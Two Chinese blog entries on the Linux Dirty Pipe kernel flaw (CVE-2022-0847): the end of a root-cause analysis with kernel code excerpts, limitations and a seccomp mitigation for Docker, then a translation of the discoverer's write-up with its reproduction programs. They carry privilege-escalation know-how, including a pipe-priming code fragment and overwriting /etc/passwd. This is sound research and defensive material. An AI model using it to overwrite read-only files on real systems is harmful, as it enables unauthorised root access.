class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buffer) : r;<br><span class="hljs-built_in">read</span>(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li><li>为什么调用完<code>splice()</code>在调用<code>write()</code>操作，可以使得两次写入同一个pipe_buf中？指针怎么调整的？<ol><li><code>splice()</code>调用<code>copy_page_to_iter_pipe()</code> 时，将待写入的文件的 page 与 pipe_buffer 的 <code>page</code> 字段关联之后，然后将 <code>pipe_inode_info</code> 实例的 <code>head</code> 值增加了 1，指向新的pipe_buffer <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,struct iov_iter *i)</span></span>&#123;<br>…… ……<br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br><span class="hljs-built_in">get_page</span>(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<span class="hljs-comment">//此时本来指向下一个pipe_buffer的</span><br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>  …… ……<br>&#125;<br></code></pre></td></tr></table></figure></li><li><code>write()</code>操作调用 <code>pipe_write()</code> 之后，会进入 <code>if (chars &amp;&amp; !was_empty)</code> 分支。if 分支里获取 <code>pipe_buffer</code> 的时候将 <code>head</code> 值减 1，从而此时 <code>pipe_buffer</code> 的 page 指向的是文件的 page。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/fs/pipe.c#L403</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span>   <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span>&#123;<br>…… ……<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<span class="hljs-comment">//这里减去了1</span><br><span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = <span class="hljs-built_in">pipe_buf_confirm</span>(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br>ret = <span class="hljs-built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);<br>…… ……<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="漏洞的局限性"><a href="#漏洞的局限性" class="headerlink" title="漏洞的局限性"></a>漏洞的局限性</h2><p><strong>1．可供攻击的机器太少。</strong><br>由于存在漏洞的是5.8以上的内核，极少有公司生产环境更新的如此及时，而最新的内核已经修复了这个漏洞。因而，野外环境中很少有机器能够利用这个漏洞。如何您的内核版本正好包含该漏洞，更新到最新版本可以修复该漏洞。</p><p><strong>2．不能持久化。</strong><br>由于修改的是页面缓存，并未修改磁盘上的文件（有极小概率某个对文件有写权限的进程碰巧执行了读写操作，导致缓存被回写磁盘），虽然可以用于提权等操作，但是如果完成提权后不对被修改的文件重新进行持久化操作的话，当操作系统回收内存或者更简单的重启机器后，所做的修改都将失效。如：修改passwd文件去除掉root用户密码后，简单一个重启操作，root密码就恢复如初了。</p><p><strong>3．特殊文件限制。</strong><br>由于文件系统的特性，一些特殊文件不经过页面缓存，导致此漏洞对这类文件无效。</p><h2 id="漏洞的缓解措施"><a href="#漏洞的缓解措施" class="headerlink" title="漏洞的缓解措施"></a>漏洞的缓解措施</h2><p>如果无法升级或修补内核，您可以部署一个不允许系统调用的 seccomp 配置文件<code>splice</code>。虽然这可能会导致某些软件包出现问题，但阻止系统调用通常不会对合法应用程序产生影响，因为使用此系统调用的情况相对较少。</p><p>具体来说，为了保护 Docker 容器，可以修改 Docker 的<a href="https://github.com/moby/moby/blob/master/profiles/seccomp/default.json">默认 seccomp 配置文件</a>并从允许的系统调用列表中删除 splice：</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2018.png"></p><p>创建自定义 seccomp 配置文件后，可以通过运行以下命令将其应用于新的 Docker 容器：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run --security-opt seccomp=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/seccomp/</span>profile.json …<br></code></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://jfrog.com/blog/dirtypipe-cve-2022-0847-the-new-dirtycow/">https://jfrog.com/blog/dirtypipe-cve-2022-0847-the-new-dirtycow/</a></p></blockquote><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol><li>这个漏洞的发现经历也非常有趣, 作者居然是从软件bug分析一路走到了内核漏洞披露, 相当佩服作者这种求索精神, 可以想象一个人在代码堆中翻阅各种实现细节时的辛酸, 也感谢作者如此详细的披露与分享。同时更重要的是追根溯源的探索的乐趣，我想这就是我为什么喜欢安全的原因之一</li><li>感慨本科所学的《计算机组成原理》，虽然当时看起来有点枯燥无用，但此时对于page,page cache,pipe这一块的知识或多或少能理解点</li><li>P牛是真卷啊，当然大家也都是，我只能慢慢跟上大家的步伐。</li><li>微博上部分评论<blockquote><p><a href="https://weibo.com/u/1684840802">瘦肉丁</a>:认真的人应得的奖赏，经常说：“在你那儿崩溃了？在我这跑好好的啊”的人，可能永远无法有深度的收获。</p><p><a href="https://weibo.com/u/2093018862">星先生cxm</a>:“排除一切不可能的，剩下的即使再不可能，那也是真相”帅啊</p></blockquote></li><li>有趣的发现：Linux 4.1 ：<a href="https://github.com/torvalds/linux/commit/5a81e6a171cdbd1fa8bc1fdd80c23d3d71816fac">commit d3d71816fac vfs: fix uninitialized flags in splice_to_pipe()</a> ：之前也存在<code>buf-&gt;flags</code>未初始化的问题</li></ol><h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><ol><li>没有用GDB来调试，只能硬看，等后期学pwn二进制的时候再折返</li><li>跟着git的操作，查看一下作者的分析历程：<a href="http://blog.nsfocus.net/unix-11-git-2/">UNIX系列(11)–GIT源码查错技巧 -scz</a></li><li>容器逃逸<ol><li><strong><strong><a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">Using the Dirty Pipe Vulnerability to Break Out from Containers</a></strong></strong></li><li><a href="https://tttang.com/archive/1484/">Docker又爆出高危逃逸漏洞了？仔细研究下事情没那么简单</a></li><li><a href="https://mp.weixin.qq.com/s/VMR_kLz1tAbHrequa2OnUA">从DirtyPipe到Docker逃逸</a></li></ol></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>漏洞原理探究：</p><ol><li>漏洞发现者：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability -by Max Kellermann</a> </li><li>ghost461@知道创宇404实验室：<a href="https://paper.seebug.org/1843/">Linux 内核提权 DirtyPipe(CVE-2022-0847) 漏洞分析</a> ，从can_merge的引入分析漏洞成因。漏洞视角这部分参考之</li><li>未然实验室@华为安全：<a href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">未然公告丨Dirty Pipe - linux内核提权漏洞分析</a> ，从管道（pipe）实现机制和pipe_write()函数分析漏洞成因（pipe.c，以及作图参考之）</li><li>bigric3_@SilverNeedleLab：<a href="https://mp.weixin.qq.com/s/BtWRasj4xsiN_kmjULFrTw">DirtyPIPE漏洞分析从0到1</a>  ，从<em>Arinerron的POC的执行步骤</em>分析漏洞成因</li><li>Nitro@360GearTeam ：<a href="https://www.anquanke.com/post/id/269886">Linux 内核 DirtyPipe 任意只读文件覆写漏洞（CVE-2022-0847）分析</a> 。函数调用分析很具体看是看不懂emm，但是漏洞复现和调试部分还是很精彩</li><li>ADLab@启明星辰:<a href="https://mp.weixin.qq.com/s/RoGHvNW2Y6dZOjgsBVVm5Q">Linux内核权限提升漏洞“DirtyPipe”（CVE-2022-0847）分析</a> ，pipe和splice系统调用实现分析比较清楚，感觉一般</li><li>little_fish：<a href="https://forum.huawei.com/enterprise/en/linux-dirty-pipe-vulnerability-cve-2022-0847/thread/836529-891">Linux Dirty Pipe Vulnerability (CVE-2022-0847)</a> ，将page cache和pipe时候通过画图挺好理解的</li></ol><p>漏洞复现：</p><ol><li>zjun:<a href="https://blog.zjun.info/2022/cve-2022-0847.html">CVE-2022-0847 Dirty Pipe Linux 内核提权漏洞</a></li><li>P牛知识星球：《代码审计》</li></ol><blockquote><p>文章来源：通过sogo搜微信公众号文章+hacking8搜+google搜，历史文章一个个点开找</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>CVE-2022-0847</tag>
      
      <tag>Dirty Pipe提权漏洞</tag>
      
      <tag>技术探索</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The Dirty Pipe Vulnerability[中文翻译]</title>
    <link href="/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/"/>
    <url>/2022/03/15/The%20Dirty%20Pipe%20Vulnerability/</url>
    
    <content type="html"><![CDATA[<h1 id="The-Dirty-Pipe-Vulnerability"><a href="#The-Dirty-Pipe-Vulnerability" class="headerlink" title="The Dirty Pipe Vulnerability"></a>The Dirty Pipe Vulnerability</h1><p>原文：<a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a><br>作者：Max Kellermann <a href="mailto:&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;</a></p><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>这是CVE-2022-0847的故事，自5.8版本以来，Linux内核中存在一个漏洞，允许覆盖任意只读文件中的数据。这会导致权限升级，因为非特权进程可以将代码注入根进程。<br>它类似于CVE-2016-5195“脏牛”，但更容易利用。<br>Linux 5.16.11、5.15.25和5.10.102中修复了该漏洞。</p><h1 id="损坏I"><a href="#损坏I" class="headerlink" title="损坏I"></a>损坏I</h1><p>这一切都始于一年前，当时有一张关于文件损坏的工单。一位客户抱怨他们下载的访问日志无法解压缩。事实上，其中一台日志服务器上有一个损坏的日志文件；它可以被解压缩，但gzip报告了一个CRC错误。我无法解释它为什么会损坏，但我认为每晚的split进程发生了crash，造成了文件的损坏。我手动修复了文件的CRC，关闭了工单，很快就忘记了这个问题。<br>几个月后，这种情况一再发生。每次文件的内容看起来都是正确的，只有文件末尾的CRC是错误的。现在有了几个损坏的文件，我能够深入挖掘，发现了一种令人惊讶的损坏问题。一种pattern浮现了出来。</p><h1 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h1><p>让我简单介绍一下日志服务器的工作原理：在CM4all托管环境中，所有web服务器（运行我们的自定义开源HTTP服务器）都会发送UDP多播数据报，其中包含关于每个HTTP请求的元数据。这些都是运行Pond的日志服务器接收的，Pond是我们定制的开源内存数据库。夜间作业将前一天的所有访问日志拆分(split)为每个托管网站的一个日志，每个日志都用zlib压缩。<br>通过HTTP，一个月的所有访问日志都可以作为一个单独的<code>.gz</code>文件下载。使用一个技巧（涉及到<code>Z_SYNC_FLUSH</code>），我们可以连接所有gzip每日日志文件，而不必解压和重新压缩它们，这意味着这个HTTP请求几乎不消耗CPU。通过使用<code>splice()</code>系统调用将数据直接从硬盘送到HTTP连接中，而不通过内核/用户空间边界（“零拷贝”），进而可以节省内存带宽。<br>Windows用户无法处理<code>.gz</code>文件，但每个人都可以解压缩ZIP文件。一个ZIP文件只是一个<code>.gz</code>文件的容器，因此我们可以使用相同的方法实时生成ZIP文件；我们需要做的就是先发送一个ZIP头，然后和往常一样连接所有<code>.gz</code>文件的内容，后面是中心目录（另一种头）。</p><h1 id="损坏II"><a href="#损坏II" class="headerlink" title="损坏II"></a>损坏II</h1><p>以下是一份正式的日常文件的结尾：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">9</span>c <span class="hljs-number">12</span> <span class="hljs-number">0b</span> f5 f7 <span class="hljs-number">4</span>a  <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><code>00 00 ff ff</code>是允许简单连接的<a href="https://www.bolet.org/~pornin/deflate-flush-fr.html">sync flush</a>。<code>03 00</code>是一个<a href="https://datatracker.ietf.org/doc/html/rfc1951#page-9">空的“final”块</a>，后面跟一个CRC32（0xf50b129c）和未压缩文件长度（<code>0x00004af7</code>=19191字节）。<br>相同的文件，但已损坏的文件结尾：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span>  <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>sync flush在，empty final block在，但未压缩的长度现在是<code>0x0014031e</code>=1.3 MB（这是错误的，因为文件是与上面相同的19kB文件）。CRC32为<code>0x02014b50</code>，这与文件内容不匹配。为什么？这是日志客户端中的out-of-bounds write还是heap corruption的BUG？<br>我比较了所有已知的损坏文件，惊讶地发现它们都有相同的CRC32和相同的“文件长度”值。总是相同的CRC——这意味着这不能是CRC计算的结果。对于损坏的数据，我们会看到不同（但错误）的CRC值。我一直盯着代码上的漏洞，盯了几个小时但找不到解释。<br>然后我盯着这8个字节。最终，我意识到<code>50 4b</code>是代表“P”和“K”的ASCII码。“PK”，这就是所有ZIP标题的开头。让我们再看看这8个字节：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><ul><li><code>50 4b</code> is “PK”</li><li><code>0x02014b50</code> 是<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Central_directory_file_header">中心目录的特征头</a></li><li>“Version made by” = <code>1e 03</code>; <code>0x1e</code> = 30 (3.0); <code>0x03</code> = UNIX</li><li>“Version needed to extract” = <code>14 00</code>; <code>0x0014</code> = 20 (2.0)<br>其余的中心目录文件头都不见了；很明显头文件在8字节后被截断。<br>这实际上是ZIP中央目录文件头的开始，这不能是巧合。但编写这些文件的进程中没有生成此类头文件的代码。在绝望中，我查看了zlib源代码和该过程使用的所有其他库，但什么也没找到。这个软件对“PK”头一无所知。<br>不过，有一个进程会生成“PK”头；web服务会实时构造ZIP文件。但这个进程以另一个用户的身份运行，该用户对这些文件没有写权限。不可能是这个进程。<br>所有这些都没有意义，但新的工单不断出现（速度非常慢）。可能存在系统上的问题，但我就是没找到。这让我很沮丧，但我忙于其他任务，我一直把这个文件损坏问题推到任务队列的后面。</li></ul><h1 id="损坏III"><a href="#损坏III" class="headerlink" title="损坏III"></a>损坏III</h1><p>外部压力使我重新意识到了这个问题。我扫描了整个硬盘，寻找损坏的文件（花了两天时间），希望出现更多的规律。事实上，有一种规律：</p><ul><li>在过去3个月内，共有37个损坏文件发生在22个独特的日期</li><li>其中18天发生1次损坏</li><li>1天发生2次损坏（2021-11-21）</li><li>1天发生7次损坏（2021-11-30）</li><li>1天发生6次损坏（2021-12-31）</li><li>1天发生4次损坏（2022-01-31）<br>每个月的最后一天显然是发生文件损坏最多的一天。<br>只有主日志服务器有损坏（提供HTTP连接和构造ZIP文件的服务器）。备用服务器（HTTP非活动，但日志提取过程相同）没有损坏文件。两台服务器上的数据都是相同的，除了那些损坏的文件。<br>这是由脆弱的硬件造成的吗？损坏的RAM？糟糕的存储？宇宙射线？不，这些症状看起来不像是硬件问题。机器里有鬼？我们需要驱魔师吗？</li></ul><h1 id="盯着代码"><a href="#盯着代码" class="headerlink" title="盯着代码"></a>盯着代码</h1><p>我又开始盯着代码上的漏洞，这次是web服务。<br>请记住，web服务会写入一个ZIP头，然后使用<code>splice()</code>发送所有压缩文件，最后再次使用<code>write()</code>发送“中心目录文件头”，该文件头以<code>50 4b 01 02 1e 03 14 00</code>开头，这正是损坏的位置。通过数据流发送的数据看起来与磁盘上的损坏文件一模一样。但是通过网络发送的进程对这些文件没有写权限（甚至没有尝试这样做），它只读取它们。不管遇到什么困难和不可能的事情，<strong>一定</strong>是这个进程导致了文件损坏，但如何导致文件损坏呢？<br>我的第一个灵感闪现，为什么总是在一个月的最后一天损坏。当网站所有者下载访问日志时，服务器从每月的第一天开始，然后是第二天，依此类推。当然，一个月的最后一天是在月底发送的；一个月的最后一天总是跟在“PK”标题后面。这就是为什么它更有可能在最后一天损坏。（如果请求的月份尚未结束，其他日子也可能会发送文件损坏问题，但这种可能性较小。）<br>所以如何导致文件损坏的？</p><h1 id="盯着内核代码"><a href="#盯着内核代码" class="headerlink" title="盯着内核代码"></a>盯着内核代码</h1><p>在这里被困了几个小时之后，且消除了所有绝对不可能的事情之后（在我看来），我得出了一个结论：这一定是一个内核错误。<br>将数据损坏归咎于Linux内核（即其他人的代码）必须是最后的手段。这不太可能。内核是一个极其复杂的项目，由成千上万的人用看似混乱的方法开发；尽管如此，它还是非常稳定和可靠的。但这一次，我确信这一定是一个内核错误。<br>在一个非常清晰的时刻，我破解了两个C程序。<br>一个程序持续将字符串“AAAAA”的奇数块写入文件（模拟日志拆分器）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br></code></pre></td></tr></table></figure><p>另一个使用<code>splice()</code>将数据从该文件传输到管道，然后将字符串“BBBBB”写入管道（模拟ZIP生成器）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure><p>我把这两个程序复制到了日志服务器上，然后…<strong>Bingo</strong>！字符串“BBBBB”开始出现在文件中，尽管从未有人将此字符串写入文件（仅通过没有写入权限的进程写入管道）。<br>所以这真的是一个内核错误！<br>一旦BUG被复现，问题就会变得很清晰。通过快速检查，验证了该漏洞影响的是Linux 5.10（Debian Bullseye），而不是Linux 4.19（Debian Buster）。v4.19和v5.10之间有185.011个git commit，但多亏了<code>git bisect</code>，只需17个步骤就可以找到错误的commit 。<br>当<code>bisect</code>到达commit <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">f6dd975583bd</a>，它为匿名管道缓冲区重构了管道缓冲区代码。它改变了管道““mergeable””检查的方式。</p><blockquote><p>之前是定义为函数的形式，然后现在定义了一个变量</p></blockquote><h1 id="管道、缓冲区和页面"><a href="#管道、缓冲区和页面" class="headerlink" title="管道、缓冲区和页面"></a>管道、缓冲区和页面</h1><p>为什么是管道？在我们的设置中，生成ZIP文件的web服务通过管道与web服务器通信；它使用了我们开源的<a href="https://github.com/CM4all/libwas/">Web应用程序套接字协议</a>，因为我们对CGI、FastCGI和AJP不满意。使用管道而不是通过套接字进行多路复用（如FastCGI和AJP所做的）有一个主要优势：可以在应用程序和web服务器中使用<code>splice()</code>，以获得最大效率。这减少了在进程外的web应用程序的开销（而不是像Apache模块那样在web服务器进程内运行web服务）。这允许在不牺牲（很多）性能的情况下分离权限。<br><a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html">Linux内存管理</a>的简短介绍：CPU管理的最小内存单元是一个<strong>Page</strong>（通常为4KB）。在Linux的内存管理层中，最底层的都是和Page相关。如果应用程序从内核请求内存，它将获得大量（匿名）Pages。所有文件I/O也都与Pages有关：如果从文件中读取数据，内核首先将大量4KB的数据块从硬盘复制到内核内存中，由一个名为<strong>Page cache</strong>(页面缓存)的子系统管理。从那里，数据将被复制到用户空间。Page cache中的副本会保留一段时间，以便再次使用，从而避免不必要的硬盘I/O，直到内核决定更好地使用该内存（回收）。使用<code>mmap()</code>系统调用将Page cache管理的Page直接映射到用户空间，而不需要将文件数据复制到用户空间内存去（以增加页面错误和TLB刷新为代价降低内存带宽的折衷方案）。Linux内核有更多的trick：<code>sendfile()</code>系统调用允许应用程序将文件内容发送到socket，而无需往返到用户空间（这是一种在通过HTTP提供静态文件的web服务器中比较流行的优化措施）。<code>splice()</code>系统调用是<code>sendfile()</code>的一种泛化：它允许进行相同的优化；传输的任一侧是管道，另一侧几乎可以是任何东西（另一个管道、一个文件、一个套接字、一个块设备、一个字符设备）。内核通过传递<strong>Page</strong> 引用(references)来实现这一点，而不是实际复制任何内容（零拷贝）。<br><strong>管道</strong>是单向进程间通信的工具。一端push数据，另一端pull数据。Linux内核通过一个<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L26-L32">struct pipe_buffer</a>的<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L76">ring</a>来实现这一点，每个pipe_buffer都指向一个<strong>Page</strong>。对管道的第一次写入会分配一个Page（可容纳4KB数据的空间）。如果最近一次写入没有完全填满页面，则后续写入可能会附加到该现有页面，而不是分配新页面。这就是“匿名”管道缓冲区的工作原理（<a href="https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L217-L221">anon_pipe_buf_ops</a>）。<br>但是，如果将<code>splice()</code>数据从文件拼接到管道中，内核将首先将数据加载到<strong>Page cache</strong>中。然后，它将创建一个指向page cache内部的<code>struct pipe_buffer</code> 的指针（零拷贝），但与匿名管道缓冲区不同，写入管道的附加数据不能附加到这样的Page上，因为Page由Page cache而不是管道拥有。<br>检查是否有可以将新数据附加到现有管道缓冲区的代码历史记录：</p><ul><li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>.</li><li><a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16, 2006)</a> 。以<code>splice()系统</code>调用为特色，引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于指向page cache的管道缓冲区，第一个是<code>can_merge=0</code>（不可合并）。</li><li><a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4</a> 将can_merge的flag转换为和 <code>struct pipe_buf_operations</code>指针比较，因为只有一个<code>anon_pipe_buf_ops</code> 可以设置了此标志。</li><li><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8, 2020)</a>  将此指针比较的方式转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br>这些年来，这个check被反复重构，哪一个是对的？或者他是什么？</li></ul><h1 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h1><p>在<code>PIPE_BUF_FLAG_CAN_MERGE</code>诞生的几年前，<a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016)</a>添加了两个新函数，它们分配了一个新的<code>struct pipe_buffer</code>，但缺少对其flags成员的初始化。现在可以使用任意flags创建Page cache的引用，但这并不重要。从技术上讲，这是一个bug，尽管当时没有任何后果，因为所有现有的flag都无法使用。<br>在Linux5.8中，这个bug突然变得非常严重，因为它使用了<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit f6dd975583bd“pipe:merge anon_pipe_buf*_ops”</a>。通过将<code>PIPE_BUF_FLAG_CAN_MERGE</code>注入Page cache引用，使得只需将新数据写入以特殊方式准备的管道，就可以覆盖Page cache中的数据。</p><h1 id="损坏IV"><a href="#损坏IV" class="headerlink" title="损坏IV"></a>损坏IV</h1><p>这就解释了文件损坏的原因：首先，一些数据被写入管道，然后大量文件被拼接，并且创建Page cache引用。这些引用随机的，可能有或可能没有设置<code>PIPE_BUF_FLAG_CAN_MERGE</code> 。如果有，那么写入中央目录文件头的<code>write()</code>调用将被写入到最后一个压缩文件的Page 